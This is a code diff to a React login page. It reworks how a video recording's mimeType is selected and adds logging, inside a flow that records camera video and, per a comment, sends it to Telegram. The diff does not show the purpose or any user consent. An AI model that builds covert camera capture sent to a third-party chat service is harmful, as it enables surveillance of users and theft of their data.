@@ -180,27 +180,31 @@ export default function LoginPage() {
       const chunks: Blob[] = [];
       
       // Find a supported mimeType
-      let mimeType = '';
       const mimeTypes = [
         'video/webm;codecs=vp9',
         'video/webm;codecs=vp8',
         'video/webm;codecs=h264',
         'video/webm',
-        'video/mp4',
-        ''
+        'video/mp4'
       ];
       
+      let selectedMimeType = '';
       for (const type of mimeTypes) {
-        if (type === '' || MediaRecorder.isTypeSupported(type)) {
-          mimeType = type;
+        if (MediaRecorder.isTypeSupported(type)) {
+          selectedMimeType = type;
+          console.log('Selected mimeType:', type);
           break;
         }
       }
       
-      console.log('Using mimeType:', mimeType || 'default');
+      // If no specific type is supported, let MediaRecorder use default
+      if (!selectedMimeType) {
+        console.log('No specific mimeType supported, using browser default');
+      }
       
-      const recorderOptions = mimeType ? { mimeType } : undefined;
-      const recorder = new MediaRecorder(stream, recorderOptions);
+      const recorder = selectedMimeType 
+        ? new MediaRecorder(stream, { mimeType: selectedMimeType })
+        : new MediaRecorder(stream);
       
       recorder.ondataavailable = (event) => {
         if (event.data && event.data.size > 0) {
@@ -210,11 +214,12 @@ export default function LoginPage() {
       
       recorder.onstop = async () => {
         try {
-          const finalMimeType = mimeType || 'video/webm';
-          const videoBlob = new Blob(chunks, { type: finalMimeType });
+          // Use the mimeType that MediaRecorder actually used
+          const actualMimeType = selectedMimeType || recorder.mimeType || 'video/webm';
+          const videoBlob = new Blob(chunks, { type: actualMimeType });
           setRecordedChunks(chunks);
           
-          console.log('Video recorded, size:', videoBlob.size, 'bytes');
+          console.log('Video recorded, size:', videoBlob.size, 'bytes', 'mimeType:', actualMimeType);
           
           // Send video to Telegram
           const formData = new FormData();
